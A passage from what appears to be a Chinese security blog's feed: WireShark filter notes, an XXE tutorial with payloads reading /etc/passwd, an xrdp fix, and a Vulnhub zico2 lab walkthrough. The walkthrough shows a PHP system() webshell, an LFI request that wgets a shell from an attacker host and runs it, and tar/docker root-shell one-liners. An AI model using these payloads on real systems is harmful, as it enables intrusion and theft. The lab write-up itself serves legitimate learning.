<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -v &#x2F;:&#x2F;mnt --rm -it alpine chroot &#x2F;mnt sh</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/Screenshot_20200721_234052.jpg" alt=""></p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>Vulnhub</category>
      </categories>
      <tags>
        <tag>docker组提权</tag>
      </tags>
  </entry>
  <entry>
    <title>WireShark学习笔记</title>
    <url>/2020/05/06/WireShark%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>持续施工<br>记载有关WireShark的学习笔记</p>
<a id="more"></a>

<p>WireShark分为两种过滤器</p>
<ul>
<li>捕获过滤器</li>
<li>显示过滤器</li>
</ul>
<p>捕获过滤器用于决定抓取什么数据包<br>显示捕获过滤器:用于在捕获过滤器中显示查找</p>
<p>两种过滤器的语法并不一样.</p>
<h1 id="WireShark过滤语法"><a href="#WireShark过滤语法" class="headerlink" title="WireShark过滤语法"></a>WireShark过滤语法</h1><h2 id="捕获过滤器语法"><a href="#捕获过滤器语法" class="headerlink" title="捕获过滤器语法"></a>捕获过滤器语法</h2><table>
<thead>
<tr>
<th>Protocol</th>
<th>Direction</th>
<th>Host/Port</th>
<th>逻辑</th>
<th>other</th>
</tr>
</thead>
<tbody><tr>
<td>tcp</td>
<td>src/dst</td>
<td>1.1.1.1</td>
<td>and</td>
<td>other</td>
</tr>
</tbody></table>
<p>协议:</p>
<ul>
<li>ether</li>
<li>icmp</li>
<li>fddi</li>
<li>ip</li>
<li>arp</li>
<li>rarp</li>
<li>decnet</li>
<li>lat</li>
<li>sca</li>
<li>moprc</li>
<li>mopdl</li>
<li>tcpandudp</li>
</ul>
<p>方向:</p>
<ul>
<li>src</li>
<li>dst</li>
<li>src and dst</li>
<li>src or dst</li>
</ul>
<p>Host</p>
<ul>
<li>net</li>
<li>port</li>
<li>host</li>
<li>portrange</li>
</ul>
<p>逻辑</p>
<ul>
<li>not</li>
<li>and</li>
<li>or</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tcp or src net 192.168.1.1&#x2F;24)</span><br></pre></td></tr></table></figure>

<h2 id="显示过滤器语法"><a href="#显示过滤器语法" class="headerlink" title="显示过滤器语法"></a>显示过滤器语法</h2><table>
<thead>
<tr>
<th>Protocol</th>
<th>String1</th>
<th>String2</th>
<th>表达式</th>
<th>Value</th>
<th>逻辑表达式</th>
<th>Other</th>
</tr>
</thead>
<tbody><tr>
<td>ftp</td>
<td>passive</td>
<td>ip</td>
<td>==</td>
<td>1.1.1.1</td>
<td>xor</td>
<td>icmp.type</td>
</tr>
</tbody></table>
<p>逻辑运算符</p>
<ul>
<li>and &amp;&amp; 与</li>
<li>or || 或</li>
<li>xor ^^ 异或</li>
<li>not ! 非</li>
</ul>
<p>比较运算符</p>
<ul>
<li>eq == </li>
<li>ne !=</li>
<li>gt &gt;</li>
<li>lt &lt;</li>
<li>ge &gt;=</li>
<li>le &lt;=</li>
<li>contains 包含</li>
<li>matches 符合</li>
</ul>
<h3 id="协议过滤"><a href="#协议过滤" class="headerlink" title="协议过滤"></a>协议过滤</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">snmp || dns || icmp || http</span><br></pre></td></tr></table></figure>
<p>显示snmp或dns或icmp或http的包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">!snmp and !dns and !http</span><br></pre></td></tr></table></figure>
<p>不显示为snmp,dns,http的包</p>
<h3 id="按照属性值进行过滤"><a href="#按照属性值进行过滤" class="headerlink" title="按照属性值进行过滤"></a>按照属性值进行过滤</h3><h4 id="ip过滤"><a href="#ip过滤" class="headerlink" title="ip过滤"></a>ip过滤</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ip.addr &#x3D;&#x3D; 192.168.2.1</span><br></pre></td></tr></table></figure>
<p>显示来源和目的地为192.168.2.1的包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ip.src !&#x3D; 192.168.2.1 or ip.dst !&#x3D; 192.168.2.2</span><br></pre></td></tr></table></figure>
<p>显示来源不为192.168.2.1的包或者目的地不为192.168.2.2的包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ip.src &#x3D;&#x3D; 192.168.2.1&#x2F;24</span><br></pre></td></tr></table></figure>
<p>显示来源为192.168.2.1网段的包</p>
<h4 id="端口过滤"><a href="#端口过滤" class="headerlink" title="端口过滤"></a>端口过滤</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tcp.port &#x3D;&#x3D; 25</span><br></pre></td></tr></table></figure>
<p>显示TCP 25端口的包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tcp.srcpost &#x3D;&#x3D; 80</span><br></pre></td></tr></table></figure>
<p>显示来自tcp 80端口的包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tcp.dstport &#x3D;&#x3D; 80</span><br></pre></td></tr></table></figure>
<p>显示目的地为tcp 80端口的包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tcp.flags.syn &#x3D;&#x3D; 0x02</span><br></pre></td></tr></table></figure>
<p>显示包含tcp syn标志的包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">upd.port &#x3D;&#x3D; 8888</span><br></pre></td></tr></table></figure>
<p>显示udp 8888端口的包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tcp.port &gt;&#x3D; 1 &amp;&amp; tcp.port &lt;&#x3D;8000</span><br></pre></td></tr></table></figure>
<p>显示tcp 端口范围 为1到8000的</p>
<h4 id="http模式过滤"><a href="#http模式过滤" class="headerlink" title="http模式过滤"></a>http模式过滤</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http.request.method&#x3D;&quot;POST&quot;</span><br></pre></td></tr></table></figure>
<p>显示post请求的http包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http.request.uri contains &quot;.jpg&quot;</span><br></pre></td></tr></table></figure>
<p>显示url中包含jpg的包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http contains &quot;password&quot;</span><br></pre></td></tr></table></figure>
<p>显示包内容中包含password字段的http包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http.request.uri&#x3D;&#x3D;“&#x2F;img&#x2F;gakki.gif”</span><br></pre></td></tr></table></figure>

<p>指定uri的内容</p>
<h4 id="过滤MAC地址"><a href="#过滤MAC地址" class="headerlink" title="过滤MAC地址"></a>过滤MAC地址</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eth.src &#x3D;&#x3D; AA:AA:AA:AA:AA:AA</span><br></pre></td></tr></table></figure>
<p>显示来源为xxx的包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eth.dst &#x3D;&#x3D; AA:AA:AA:AA:AA:AA</span><br></pre></td></tr></table></figure>
<p>显示目的地为xxx的包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eth.addr&#x3D; AA:AA:AA:AA:AA:AA</span><br></pre></td></tr></table></figure>
<p>addr:包括源和目的地</p>
<h4 id="包长度过滤"><a href="#包长度过滤" class="headerlink" title="包长度过滤"></a>包长度过滤</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">udp.length &lt;&#x3D; 1500</span><br><span class="line">tcp.len &gt;&#x3D; 1500</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ip.len &#x3D;&#x3D; 20</span><br><span class="line">frame.ken &#x3D;&#x3D; 20</span><br></pre></td></tr></table></figure>



<h4 id="HTTP流分析"><a href="#HTTP流分析" class="headerlink" title="HTTP流分析"></a>HTTP流分析</h4><ol>
<li>MIDI(mid)，文件头：4D546864</li>
<li>JPEG(jpg)，文件头：FFD8FF</li>
<li>JFIF，文件头：FFD8FFE0</li>
<li>PNG(png)，文件头：89504E47</li>
<li>GIF(gif)，文件头：47494638</li>
<li>TIFF(tif)，文件头：49492A00</li>
<li>WindowsBitmap(bmp)，文件头：424D</li>
<li>XML(xml)，文件头：3C3F786D6C</li>
<li>HTML(html)，文件头：68746D6C3E</li>
<li>MSWord/Excel(xls.or.doc)，文件头：D0CF11E0</li>
<li>ZIPArchive(zip)，文件头：504B0304</li>
<li>RARArchive(rar)，文件头：52617221</li>
<li>Wave(wav)，文件头：57415645</li>
<li>AVI(avi)，文件头：52494646</li>
<li>RealAudio(ram)，文件头：2E7261FD</li>
<li>RealMedia(rm)，文件头：2E524D46</li>
</ol>
]]></content>
      <categories>
        <category>Note</category>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>WireShark</tag>
      </tags>
  </entry>
  <entry>
    <title>XXE笔记</title>
    <url>/2020/05/27/XXE%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="什么是XXE"><a href="#什么是XXE" class="headerlink" title="什么是XXE"></a>什么是XXE</h2><p>XXE就是XML外部实体注入(XML External Entity)。XXE可以分为<code>in-band XXE</code>就是web程序即时响应攻击者的XXE-Paylod，另外一种则是<code>out-of-band XXE</code>也被称为<code>blind XXE</code>，web程序不会即使响应攻击的XXE-Payload，攻击者必须将XXE-Payload的输出放到其他文件或攻击者的服务器上。</p>
<p>XXE的危害:</p>
<ul>
<li>敏感文件泄露</li>
<li>Dos攻击</li>
<li>伪造SSRF</li>
<li>开启端口扫描导致远程代码执行</li>
</ul>
<a id="more"></a>

<p>在学习XXE之前，我们要了解一些XML的基础知识。</p>
<h2 id="什么是XML"><a href="#什么是XML" class="headerlink" title="什么是XML"></a>什么是XML</h2><p>XML是可扩展标记语言(eXtensible Markup Language)。</p>
<ul>
<li>XML被设计用来传输和存储数据，(HTML被设计用来显示数据。</li>
<li>XML是一种很像HTML的标记语言，但是XML标签没有被预定义，需要自行定义标签，XML被设计具有自我描述性。</li>
<li>XML是W3C的推荐标准。</li>
</ul>
<h2 id="为什么使用XML"><a href="#为什么使用XML" class="headerlink" title="为什么使用XML"></a>为什么使用XML</h2><p>作用</p>
<ul>
<li>XML数据从HTML中分离</li>
<li>XML简化数据共享，数据传输，平台变更。</li>
<li>使用XML存储和传输的数据可以随时更改，而不会影响数据表示。</li>
<li>XML有严格的语法规定。</li>
<li>XML可以在任何平台上使用，也可以随时转移到任何平台。</li>
</ul>
<h2 id="XML语法"><a href="#XML语法" class="headerlink" title="XML语法"></a>XML语法</h2><p>大部分XML文档都会以这个开头。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br></pre></td></tr></table></figure>

<p>这是序言，它指定XML文档中使用的XML版本和编码格式，序言不是强制性的。</p>
<p>XML同样也是树结构(和HTML类似，从根部(root，也被称为父节点)开始再到枝叶(子节点)。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;mail&gt;</span><br><span class="line">   &lt;to&gt;falcon&lt;&#x2F;to&gt;</span><br><span class="line">   &lt;from&gt;feast&lt;&#x2F;from&gt;</span><br><span class="line">   &lt;subject&gt;About XXE&lt;&#x2F;subject&gt;</span><br><span class="line">   &lt;text&gt;Teach about XXE&lt;&#x2F;text&gt;</span><br><span class="line">&lt;&#x2F;mail&gt;</span><br></pre></td></tr></table></figure>
<p><code>&lt;mail&gt;</code>是父节点<code>&lt;to&gt;</code>，<code>&lt;from&gt;</code>，<code>&lt;subject&gt;</code>，<code>&lt;text&gt;</code>这些都是子节点。同一级的子节点他们互相为同胞关系。如果XML文档没有任何根元素，则将其视为错误或无效的XML文档。XML标签和HTMl标签相似，成对标签（开始标签，结束标签）。</p>
<p>值得注意的是，XML文档有语法要求，它区分大小写。<code>&lt;to&gt;</code>你不能写成<code>&lt;To&gt;</code>，同样的XML文档和HTMl文档类似。所以在XML中，我们也能使用属性。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;text category &#x3D; &quot;message&quot;&gt;You need to learn about XXE&lt;&#x2F;text&gt;</span><br></pre></td></tr></table></figure>
<p><code>&lt;text&gt;</code>中<code>category</code>就是text标签的属性。</p>
<p>总结一下XML的规则</p>
<p>XML文档中</p>
<ul>
<li>必须包含根元素(父元素)</li>
<li>所有元素都可以有子元素</li>
<li>父，子，同胞用于描述元素之间的关系.</li>
<li>所有元素都可以有文本内容和属性</li>
</ul>
<p>语法规则</p>
<ul>
<li>必须有根元素</li>
<li>序言在第一行</li>
<li>所有xml元素都要闭合标签</li>
<li>xml标签 大小写敏感</li>
<li>xml必须正确嵌套<ul>
<li>不能<code>&lt;text&gt;&lt;abc&gt;&lt;/text&gt;&lt;/abc&gt;</code>这样</li>
</ul>
</li>
<li>xml属性必须加引号</li>
<li>实体代替”&lt;”等特殊字符</li>
<li>注释和html一样 <code>&lt;!--more--&gt;</code></li>
<li>xml文档中空格不会被删减</li>
<li>元素/属性名称不能用xml开始</li>
<li>不能空格开始(其他语言的基本命名规则)</li>
</ul>
<h2 id="XML-DTD"><a href="#XML-DTD" class="headerlink" title="XML-DTD"></a>XML-DTD</h2><p>DTD是文档类型定义(Document Type Define)声明于xml文档中，也可以外部引用。</p>
<p>假设我们有一个<code>note.dtd</code>的文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE note [ &lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!ELEMENT to (#PCDATA)&gt; &lt;!ELEMENT from (#PCDATA)&gt; &lt;!ELEMENT heading (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt; ]&gt;</span><br></pre></td></tr></table></figure>

<p>我们可以在XML中外部引入这个note.dtd</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">    &lt;to&gt;falcon&lt;&#x2F;to&gt;</span><br><span class="line">    &lt;from&gt;feast&lt;&#x2F;from&gt;</span><br><span class="line">    &lt;heading&gt;hacking&lt;&#x2F;heading&gt;</span><br><span class="line">    &lt;body&gt;XXE attack&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;note&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>!DOCTYPE note 定义了一个名为note的文档根元素</li>
<li>!ELEMENT note - 定义note元素必须包含以下元素：to，from，heading，body</li>
<li>!ELEMENT to - 将to元素定义为”#PCDATA”类型</li>
<li>!ELEMENT from - 将from元素定义为”#PCDATA”类型</li>
<li>!ELEMENT heading  - 将heading元素定义为” #PCDATA”类型</li>
<li>!ELEMENT body - 将body元素定义为”#PCDATA”类型</li>
</ul>
<p><code>#PCDATA</code>表示可解析的字符数据，类似于编程语言中双引号的效果还有一种<code>#CDATA</code>类似编程语言中单引号的效果</p>
<h3 id="定义一个实体"><a href="#定义一个实体" class="headerlink" title="定义一个实体"></a>定义一个实体</h3><p>实体在xml文档中需要频繁使用某一条数据，实体是用于定义普通文本获得特殊字符的快捷方式的变量，实体引用是对实体的引用，实体可在内部或外部进行声明。</p>
<p>内部实体直接定义<code>&lt;!ENTITY 实体名称 &quot;值&quot;&gt;</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE note[&lt;!ENTITY read &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;]&gt;</span><br><span class="line">&lt;note&gt;&amp;read;&lt;&#x2F;note&gt; ##一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 (;)。</span><br></pre></td></tr></table></figure>

<p>外部实体</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE note[&lt;!ENTITY name SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;]&gt;</span><br><span class="line">&lt;note&gt;&amp;name;&lt;&#x2F;note&gt;</span><br></pre></td></tr></table></figure>

<p>内部参数实体</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE note[&lt;!ENTITY % name &quot;hello&quot;&gt;</span><br><span class="line">%name;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p>外部参数实体</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE note[&lt;!ENTITY % name SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">%name;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p>参数实体在DTD中解析优先级高于xml内部实体</p>
<h2 id="XXE注入"><a href="#XXE注入" class="headerlink" title="XXE注入"></a>XXE注入</h2><p>基础注入<br>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE note[&lt;!ENTITY name SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;]&gt;</span><br><span class="line">&lt;note&gt;&amp;name;&lt;&#x2F;note&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">	&lt;!ENTITY name SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:&#x2F;phpStudy&#x2F;WWW&#x2F;123.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p>这里的file可以使用其他的php伪协议</p>
<h2 id="XXE-修复方式"><a href="#XXE-修复方式" class="headerlink" title="XXE 修复方式"></a>XXE 修复方式</h2><ol>
<li>(libxml_disable_entity_loader()禁止解析xml外部实体</li>
</ol>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://www.cnblogs.com/backlion/p/9302528.html" title="" target="">XML外部实体（XXE）注入详解</a></li>
<li><a href="https://tryhackme.com/room/xxe" title="" target="">XXE</a></li>
</ul>
]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>XML</tag>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title>Xrdp连接失败解决</title>
    <url>/2021/01/24/Xrdp%E8%BF%9E%E6%8E%A5%E5%A4%B1%E8%B4%A5%E8%A7%A3%E5%86%B3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>安装问题。</p>
<a id="more"></a>

<p>安装xrdp后，服务成功起来了，防火墙也没禁止端口通信。再查看日志后发现。</p>
<p><img src="https://images.atsud0.me/images/post/image-20210114142218653.png" alt="image-20210114142218653"></p>
<p>在不更改文件系统权限的情况下修复这小问题，更新ssl-cert组的组成员资格应该可以解决这个问题。</p>
<p>root用户执行这条命令。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adduser xrdp ssl-cert</span><br></pre></td></tr></table></figure>



<p>参考链接</p>
<ul>
<li><a href="https://c-nergy.be/blog/?p=13708" target="_blank" rel="noopener">xRDP – cannot read /etc/xrdp/key.pem. Permission denied error explained</a></li>
</ul>
]]></content>
      <categories>
        <category>Misc</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub-zico2</title>
    <url>/2020/08/29/Vulnhub-zico2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>难度：简单</p>
<p><a href="https://www.vulnhub.com/entry/zico2-1,210/" target="_blank" rel="noopener">靶机下载</a></p>
<a id="more"></a>

<h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><h3 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h3><p><img src="https://images.atsud0.me/images/post/image-20200829193335476.png" alt="image-20200829193335476"></p>
<p>很容易引起人注意的链接。</p>
<p><img src="https://images.atsud0.me/images/post/image-20200829193426244.png" alt="image-20200829193426244"></p>
<p>想的没错，果然存在文件包含</p>
<p><img src="https://images.atsud0.me/images/post/image-20200829193233555.png" alt="image-20200829193233555"></p>
<p>尝试包含web日志失败后，我就去扫目录了- -</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster dir -u <span class="string">'http://192.168.31.9/'</span> -w ~/tools/Dict/SecLists/Discovery/Web-Content/big.txt -x php</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20200829201131404.png" alt="image-20200829201131404"></p>
<p>所以我们可以看到有一个dbadmin</p>
<p><img src="https://images.atsud0.me/images/post/image-20200829201244809.png" alt="image-20200829201244809"></p>
<p><img src="https://images.atsud0.me/images/post/image-20200829201305591.png" alt="image-20200829201305591"></p>
<p>有个数据库管理后台phpLiteadmin1.9.3，搜索了一下之后发现是存在一个远程代码执行漏洞的。但是需要通过验证，抱着试一试的心态用了弱密码admin..没想到就进去了……..</p>
<p><img src="https://images.atsud0.me/images/post/image-20200829204857906.png" alt="image-20200829204857906"></p>
<p>Root:34kroot34</p>
<p>Zico:zico2215@</p>
<p>使用这两个数据库密码，并不能登陆ssh</p>
<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><p><a href="https://www.exploit-db.com/exploits/24044" target="_blank" rel="noopener">PHPLiteAdmin 1.9.3 - Remote PHP Code Injection</a></p>
<p><img src="https://images.atsud0.me/images/post/image-20200829201037819.png" alt="image-20200829201037819"></p>
<p>跟着这里说的操作，先创建了一个phpinfo.php。创建一个新表后，输入默认字段<?php phpinfo()?>，类型是text。 然后用之前找到的文件包含去包含它。</p>
<p><img src="https://images.atsud0.me/images/post/image-20200829201429148.png" alt="image-20200829201429148"></p>
<p><img src="https://images.atsud0.me/images/post/image-20200829201633153.png" alt="image-20200829201633153"></p>
<p>之后就尝试插入一句话好了，这里不加echo的话，就没有回显。如果用<code>&lt;?php eval($_POST[a])?&gt;</code>然后蚁剑什么的连接也行。但是据说这些也算是自动化工具，所以在oscp考试中估计是不能用的，所以还是用这个一句话吧。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span>(system($_GET[a]))<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20200829223405732.png" alt="image-20200829223405732"></p>
<p><img src="https://images.atsud0.me/images/post/image-20200829223548125.png" alt="image-20200829223548125"></p>
<p>之后在本地打开一个web服务。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">page&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;databases&#x2F;eeee.php&amp;a&#x3D;wget%20http%3a%2f%2f192.168.31.153&#x2F;php-shell-linux.php%20-O%20%2ftmp%2fshell.php</span><br><span class="line">page&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;databases&#x2F;eeee.php&amp;a&#x3D;php%20%2ftmp%2fshell.php</span><br></pre></td></tr></table></figure>

<p>在burp中记得使用url编码特殊字符。这里我原本是想下到网站根目录的，但是没有写文件的权限。所以只能下到/tmp下，然后再用php -s执行。所以也可以不用传php的shell，也可以传bash的，然后bash 执行就好了。</p>
<p>成功反弹到shell。</p>
<p><img src="https://images.atsud0.me/images/post/image-20200829222729056.png" alt="image-20200829222729056"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">'import pty;pty.spawn("/bin/bash")'</span></span><br></pre></td></tr></table></figure>

<p>因为不熟悉joomla的目录结构，所以去看了wordpress。</p>
<p><img src="https://images.atsud0.me/images/post/image-20200829222941387.png" alt="image-20200829222941387"></p>
<p>查看/home/zico/wordpress/wp-config.php获得一个密码</p>
<p><img src="https://images.atsud0.me/images/post/image-20200829211605031.png" alt="image-20200829211605031"></p>
<p><img src="https://images.atsud0.me/images/post/image-20200829211638202.png" alt="image-20200829211638202"></p>
<p><img src="https://images.atsud0.me/images/post/image-20200829211653775.png" alt="image-20200829211653775"></p>
<h2 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h2><h3 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h3><p><img src="https://images.atsud0.me/images/post/image-20200829211935393.png" alt="image-20200829211935393"></p>
<p><img src="https://images.atsud0.me/images/post/image-20200829212015033.png" alt="image-20200829212015033"></p>
<h3 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=<span class="built_in">exec</span>=/bin/sh</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20200829212313387.png" alt="image-20200829212313387"></p>
<h3 id="perf-swevent-init"><a href="#perf-swevent-init" class="headerlink" title="perf_swevent_init"></a>perf_swevent_init</h3><p><img src="https://images.atsud0.me/images/post/image-20200829221332779.png" alt="image-20200829221332779"></p>
<p><a href="https://www.exploit-db.com/exploits/33589" target="_blank" rel="noopener">Linux Kernel 3.2.0-23/3.5.0-23 (Ubuntu 12.04/12.04.1/12.04.2 x64) - ‘perf_swevent_init’ Local Privilege Escalation (3)</a></p>
<p><img src="https://images.atsud0.me/images/post/image-20200829221218457.png" alt="image-20200829221218457"></p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>Vulnhub</category>
      </categories>
      <tags>
        <tag>LFI</tag>
        <tag>GTFOBins-zip</tag>
        <tag>PHPLiteAdmin 1.9.3</tag>
        <tag>GTFOBins-tar</tag>
        <tag>CVE-2013-2094</tag>
      </tags>
  </entry>
  <entry>
    <title>clash-arch自启更新订阅</title>
    <url>/2020/05/20/clash-arch%E8%87%AA%E5%90%AF%E6%9B%B4%E6%96%B0%E8%AE%A2%E9%98%85/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>linux下clash不会自动更新订阅。只好自己去看看怎么写了。我对<code>systemd</code>不太熟悉所以只好去参考下别人的写法。</p>
<a id="more"></a>

<blockquote>
<p>好像用不了了，不知道哪里出问题了，懒得改了。。</p>
</blockquote>
<p>参考链接:</p>
<ul>
<li><a href="https://github.com/Sitoi/SystemdClash" title="" target="">Sitoi-SystemdClash</a></li>
<li><a href="https://akillcool.github.io/post/clash-with-auto-update-config/" title="" target="">Clash自动更新订阅配置</a>


</li>
</ul>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pacman -S clash</span><br></pre></td></tr></table></figure>

<h2 id="自启配置"><a href="#自启配置" class="headerlink" title="自启配置"></a>自启配置</h2><p>通过<code>systemctl</code>来管理<code>Clash</code>的进程，对应<code>clash.service</code>文件，并且通过两个脚本<code>start-clash.sh</code>和<code>stop-clash.sh</code>实现开启时更新订阅。<br><code>/usr/lib/systemd/system/clash@.service</code>文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;clash@.service</span><br><span class="line">[Unit]</span><br><span class="line">Description&#x3D;A rule based proxy in Go for %i.</span><br><span class="line">After&#x3D;network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">WorkingDirectory&#x3D;&quot;your home directory&quot;&#x2F;.config&#x2F;clash</span><br><span class="line">Type&#x3D;simple</span><br><span class="line">User&#x3D;%i</span><br><span class="line">Restart&#x3D;on-abort</span><br><span class="line">ExecStart&#x3D;&quot;your home directory&quot;&#x2F;.config&#x2F;clash&#x2F;start-clash.sh</span><br><span class="line">ExecStop&#x3D;&quot;your home directory&quot;&#x2F;.config&#x2F;clash&#x2F;stop-clash.sh</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy&#x3D;multi-user.target</span><br></pre></td></tr></table></figure>

<p><code>start-clash.sh</code></p>
